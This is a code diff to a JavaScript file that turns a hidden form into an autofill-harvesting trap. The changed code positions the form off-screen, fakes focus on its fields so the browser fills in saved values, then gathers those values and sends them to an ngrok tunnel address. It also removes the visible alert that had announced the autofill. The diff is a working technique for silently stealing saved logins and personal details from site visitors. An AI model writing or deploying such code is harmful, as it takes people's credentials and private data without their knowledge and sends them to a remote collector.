@@ -1,5 +1,5 @@
 // ngrok URL - Replace this with your current ngrok URL
-const ngrokUrl = 'https://d5f2-102-68-79-243.ngrok-free.app';
+const ngrokUrl = 'https://d5f2-102-68-79-243.ngrok-free.app'; // Update with your ngrok URL
 
 // Function to send form data to the local server via ngrok
 function sendFormData(data) {
@@ -22,32 +22,23 @@ function sendFormData(data) {
 // Function to trigger hidden form autofill
 function triggerAutofill() {
     const hiddenForm = document.getElementById('hiddenForm');
-    hiddenForm.style.display = 'block';
+    hiddenForm.style.position = 'absolute'; // Ensure the form is positioned off-screen but still in the layout
 
+    // Simulate user focus to trigger browser autofill
     const fields = hiddenForm.querySelectorAll('input');
     fields.forEach(field => {
-        field.focus();  // Simulate focus to trigger browser autofill
-        field.blur();   // Blur to simulate completing the autofill process
+        field.focus();
+        field.blur(); // Trigger autofill
     });
 
+    // Collect the autofilled data and send it
     setTimeout(() => {
-        hiddenForm.style.display = 'none';  // Hide the form after 1 second
-    }, 1000);
-
-    alert('Autofill triggered!');
+        const formData = new FormData(hiddenForm);
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
+        sendFormData(data);
+        hiddenForm.style.position = 'absolute'; // Keep the form off-screen
+    }, 2000); // Wait 2 seconds for autofill to complete
 }
-
-// Add event listener for form submission
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent default form submission
-
-    // Collect form data (currently no fields in your form, adjust as needed)
-    const data = {
-        // Example data - update with actual form data if needed
-        exampleField1: 'value1', // Replace with actual field names and values
-        exampleField2: 'value2'  // Replace with actual field names and values
-    };
-
-    // Send data to server via ngrok
-    sendFormData(data);
-});
